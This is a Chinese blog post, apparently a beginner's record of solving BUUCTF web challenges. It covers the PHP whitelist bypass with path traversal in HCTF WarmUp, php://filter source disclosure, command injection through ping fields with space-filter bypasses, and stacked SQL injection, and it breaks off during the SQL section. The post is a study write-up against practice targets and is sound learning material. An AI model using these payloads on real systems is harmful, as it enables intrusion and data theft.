<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Buuctf Recording | Dralin's SweetNest</title><meta name="author" content="DralinF"><meta name="copyright" content="DralinF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历开启靶机,发现是一个大大的滑稽脸。ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。访问这个文件,看到关键源码(就是下面的代码,这里是详细说明) 1234567891011121314151617181920212223242526272829303132333435363738394041">
<meta property="og:type" content="article">
<meta property="og:title" content="Buuctf Recording">
<meta property="og:url" content="http://fzsecurity-github.github.io/2023/10/27/buuojctf/index.html">
<meta property="og:site_name" content="Dralin&#39;s SweetNest">
<meta property="og:description" content="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历开启靶机,发现是一个大大的滑稽脸。ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。访问这个文件,看到关键源码(就是下面的代码,这里是详细说明) 1234567891011121314151617181920212223242526272829303132333435363738394041">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://fzsecurity-github.github.io/img/reHe.jpg">
<meta property="article:published_time" content="2023-10-27T13:21:32.000Z">
<meta property="article:modified_time" content="2023-12-13T13:39:06.626Z">
<meta property="article:author" content="DralinF">
<meta property="article:tag" content="实战练习心得">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fzsecurity-github.github.io/img/reHe.jpg"><link rel="shortcut icon" href="/img/sweetwo.png"><link rel="canonical" href="http://fzsecurity-github.github.io/2023/10/27/buuojctf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: DralinF","link":"链接: ","source":"来源: Dralin's SweetNest","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Buuctf Recording',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-13 21:39:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/myStyle.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/reHe.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dralin's SweetNest"><span class="site-name">Dralin's SweetNest</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Buuctf Recording</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-27T13:21:32.000Z" title="发表于 2023-10-27 21:21:32">2023-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-13T13:39:06.626Z" title="更新于 2023-12-13 21:39:06">2023-12-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Recorder/">Recorder</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>50分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Buuctf Recording"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="HCTF-2018-WarmUp–代码审计-文件包含-目录遍历"><a href="#HCTF-2018-WarmUp–代码审计-文件包含-目录遍历" class="headerlink" title="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历"></a>[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</h2><p>开启靶机,发现是一个大大的滑稽脸。<br><img src="https://pic.imgdb.cn/item/653bca68c458853aeff5c5cb.jpg" alt="图一" title="滑稽脸"><br>ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。<br><img src="https://pic.imgdb.cn/item/653bca7bc458853aeff6218b.jpg" alt="图二" title="滑稽脸源码"><br>访问这个文件,看到关键源码(就是下面的代码,这里是详细说明)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)//接收属性值并判断文件名</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单验证</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//在白名单内的就返回为真</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//法一</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(//这里挺关键意思是把接收的值的第一个?前的内容截取</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//截取后判断</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//法二</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//其实和上面一样,只不过这里是url解码,那就将?编码两次(这里解一次码,服务器也会自动解一次码)其余同法一</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//这个是三个条件(输入非空、输入的是字符串、且上面的check函数返回为true),最主要的是checkfile函数返回为真,三个条件满足则会得到flag</span></span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//关键的包含flag文件的函数</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一些函数的定义:<br>mb_substr： 获取部分字符串。<br>mb_strpos： 查找字符串在另一个字符串中首次出现的位置。<br>in_array($needle, $haystack)：needle待搜索值，haystack待搜索数组。<br>有了上述分析支持后,开始解题。<br>首先根据这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单验证</span></span><br><span class="line">          <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span></span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//在白名单内的就返回为真</span></span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>我先读取一个hint.php文件康康<br><img src="https://pic.imgdb.cn/item/653bca8dc458853aeff68098.jpg" alt="图三" title="hint.php"><br>发现输出flag在ffffllll什么的文件(小寄巧:ffffllllaaaagggg这里flag被写了四次所以使用4或5个..&#x2F; 我tk,第一次做ctf题给我整这是吧?),我们尝试读取,但是由于存在过滤,并不可直接读取,采用以下payload绕过。<br>法一:</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">int</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>法二(将?url编码两次):</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php%<span class="number">253</span>F..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>依此法,可获得flag<br><img src="https://pic.imgdb.cn/item/653bca94c458853aeff69f73.jpg" alt="图四" title="法一绕过输出flag"><br><img src="https://pic.imgdb.cn/item/653bcaf6c458853aeff89f67.jpg" alt="图五" title="法二绕过输出flag"><br>参考:<code>https://blog.csdn.net/Lixunzhe0112/article/details/128716492</code></p>
<h2 id="ACTF2020-新生赛-Include–文件包含-协议玩法"><a href="#ACTF2020-新生赛-Include–文件包含-协议玩法" class="headerlink" title="[ACTF2020 新生赛]Include–文件包含|协议玩法"></a>[ACTF2020 新生赛]Include–文件包含|协议玩法</h2><p>开启靶机,发现有一个超链接,点击进去,只有”can you find out the flag?”,这里我卡了挺久,抓包也抓了;爆路径也尝试了,一无所获。<br><img src="https://pic.imgdb.cn/item/653bd282c458853aef2a63e8.jpg" alt="图六" title="单一的界面"><br>先改造以下超链接(直接指向这一个文件),发现显示页面不变,说明这个超链接是直接指向flag.php的。<br><img src="https://pic.imgdb.cn/item/653bd28ac458853aef2aa9aa.jpg" alt="图七" title="一个小发现"><br>最终参考了wp,学习到以下知识点。<br>1、PHP 中若通过 require()、once_require() 或 include() 、once_include() 函数去包含另一个文件，该文件在网页中均是不可见的（即使你查看网页源代码）。<br>2、可以发现 flag.php 页面通过 get 方式中的参数 file 来包含网站当前目录下的其他文件（如 flag.php），再加上提示 “你能找到其他 flag 吗？” ，我们可以推断，要解答该题目需要获取 flag.php 的源代码。<br>分析过后,我们便有了解决方法。<br>思路:我们可以通过将包含的文件进行转码，让浏览器无法识别这是 PHP 代码，其也就无法执行该 PHP 文件，于是将文件中的内容直接显示出来，我们将通过 PHP 伪协议来完成这一动作。<br>使用 PHP 伪协议将网页源代码转换为 base64 编码的格式：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>构造payload并且访问,得到一串base64编码的数据。<br><img src="https://pic.imgdb.cn/item/653bd29cc458853aef2b3fa3.jpg" alt="图八" title="成功获取关键key"><br>上网找一个在线base64解码工具即可得到flag。</p>
<h2 id="ACTF2020-新生赛-Exec–命令执行"><a href="#ACTF2020-新生赛-Exec–命令执行" class="headerlink" title="[ACTF2020 新生赛]Exec–命令执行"></a>[ACTF2020 新生赛]Exec–命令执行</h2><p>开启靶机,发现是一个简易实现ping命令的文本输入框。<br>那么就是简单的命令执行,说到命令执行,那么就要思考以下几点:<br>1、对方是什么操作系统:windows|linux?<br>2、可不可以多条命令一起执行?<br>首先判断os,这里先抓包看,但是看不出来。<br><img src="https://pic.imgdb.cn/item/653bd9eac458853aef60f2cf.jpg" alt="图九" title="抓包判断os"><br>那么只能盲猜,先用ipconfig再用ifconfig<br>这里ipconfig没反应,但是ifconfig有反应,所以必是linux系统且支持多条命令执行。<br>如127.0.0.1;ifconfig(推荐.;是linux中的管道符)或127.0.0.1;ifconfig。<br><img src="https://pic.imgdb.cn/item/653bdac7c458853aef6559e5.jpg" alt="图十" title="盲猜"><br>知道这一点,那么我们就可以自定义命令找flag了。<br>先查看当前目录,发现只有一个index.php文件,明显flag不存在于此处。<br><img src="https://pic.imgdb.cn/item/653bdaedc458853aef6613bc.jpg" alt="图十一" title="探针到一个文件"><br>使用:”ls -al &#x2F;“ 是一个在命令行中使用的命令。它的作用是列出根目录下所有文件和文件夹的详细信息。<br><img src="https://pic.imgdb.cn/item/653bdb4ac458853aef692236.jpg" alt="图十二" title="发现目标"><br>最后查看flag(这里一定要cat &#x2F;flag而不可以cat flag)<br><img src="https://pic.imgdb.cn/item/653bdb51c458853aef695a75.jpg" alt="图十三" title="获取flag"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计"><a href="#GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计" class="headerlink" title="[GXYCTF2019]Ping Ping Ping–命令执行|代码审计"></a>[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</h2><p>开启靶机,提示很明显,就是一个ip属性值接收IP地址ping。<br>但是依旧可以多条命令执行,但是这里用到linux的管道符”;”,原因是在网址栏操作。<br>那么我们先看下ip康康是否支持。<br><img src="https://pic.imgdb.cn/item/653c737dc458853aef34db78.jpg" alt="图十四" title="管道符"><br>确实可以,那么就可以接着往下了。我想一步到位直接读取flag,但是发现空格被过滤了<br><img src="https://pic.imgdb.cn/item/653c73edc458853aef366532.jpg" alt="图十五" title="空格过滤"><br>退而求其次,绕过空格过滤<br>空格的绕过方法为:</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>$RIFS)替换</span><br><span class="line"><span class="number">2.</span>$IFS$1替换</span><br><span class="line"><span class="number">3.</span>$KIFS替换</span><br><span class="line"><span class="number">4.</span>%20替换</span><br><span class="line"><span class="number">5.</span>&lt;和&lt;&gt;重定向符替换</span><br><span class="line"><span class="number">6.</span>%09替换</span><br><span class="line"><span class="number">7</span>、<span class="comment">/**/</span>替换</span><br></pre></td></tr></table></figure>
<p>全部进行实验可以发现只有$IFS$1可以绕过但同时也发现flag也被过滤<br><img src="https://pic.imgdb.cn/item/653c73fac458853aef368ed2.jpg" alt="图十六" title="绕过空格但是flag也被过滤"><br>没办法,只可以读取index.php看看过滤规则<br><img src="https://pic.imgdb.cn/item/653c740ec458853aef36d458.jpg" alt="图十七" title="利用代码里面的漏洞进行过滤"><br>可以知道,过滤全是正则,什么大小写都不行,但存在一个变量$a,那么我们可以利用这个进行传参实现绕过。<br>payload:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
<p>这里打开后不会立刻看到flag,那么我们就要坚定内心,坚信自己一定没错究竟是在哪里呢,查看源码成功获取flag。<br><img src="https://pic.imgdb.cn/item/653c7419c458853aef36fd3c.jpg" alt="图十八" title="查看源码获取flag"><br>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_78136321/article/details/133294740">https://blog.csdn.net/2301_78136321/article/details/133294740</a><br>这道题我觉得是有点恶心的,对于我来说前面已经耗费太多精力了,本想着终于获取到flag了,但是空空如也还看看源码,心态容易崩,还要继续提升。</p>
<h2 id="强网杯-2019-随便注–SQL注入-堆叠注入"><a href="#强网杯-2019-随便注–SQL注入-堆叠注入" class="headerlink" title="[强网杯 2019]随便注–SQL注入|堆叠注入"></a>[强网杯 2019]随便注–SQL注入|堆叠注入</h2><p>开启靶机,是一个熟悉的sql注入题目(有提示)。<br>先判断有无注入点以及是字符型或者数字型。<br>这里测试出来存在注入点以及是字符型(输入1没报错,1’报错)。<br><img src="https://pic.imgdb.cn/item/653c7c44c458853aef5534cd.jpg" alt="图十九" title="判断有无注入点以及是字符型或者数字型"><br>!!!tips:想说一句,看到带输入框的,尽量把注入语句写到框内<br>继续测试,这里用or而非and(原因是前面1’错误,or后面的1&#x3D;1为真,那么总体为真就会把所有数据都输出;而and只会报错输出一个)。<br>也就是:or爆全;and爆一个。<br><img src="https://pic.imgdb.cn/item/653c7c49c458853aef55455b.jpg" alt="图二十" title="or"><br>接着使用order by判断列数。<br><img src="https://pic.imgdb.cn/item/653c7c57c458853aef5575ff.jpg" alt="图二十一" title="order by判断列数"><br><img src="https://pic.imgdb.cn/item/653c7c5ec458853aef558cd9.jpg" alt="图二十二" title="order by判断列数"><br>判断出来是存在两列,猜测是id号+数据。开始真正意义上的注入<br>先来一个union+select(大小写均是一遍)<br>发现存在过滤<br><img src="https://pic.imgdb.cn/item/653c97aac458853aefb6d4a9.jpg" alt="图二十三" title="发现存在过滤"><br>返回一个正则过滤规则，可以看到几乎所有常用的字段都被过滤了。这里尝试过双写绕过，16进制绕过等；不过过滤机制太强，都不行。<br>这里技穷了,没有任何思路,看了下wp,才想到可以堆叠注入(注意使用数据库语句)。<br>先试着查一下数据库</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>成功查询到,说明存在堆叠注入,那么我们后面都围绕堆叠注入展开。<br><img src="https://pic.imgdb.cn/item/653c9845c458853aefb9b864.jpg" alt="图二十四" title="存在堆叠"><br>再爆表</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十五" title="堆叠爆表"><br>可以看到当前库下有两张表（1919810931114514和words）。<br>先查words表中的列名</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
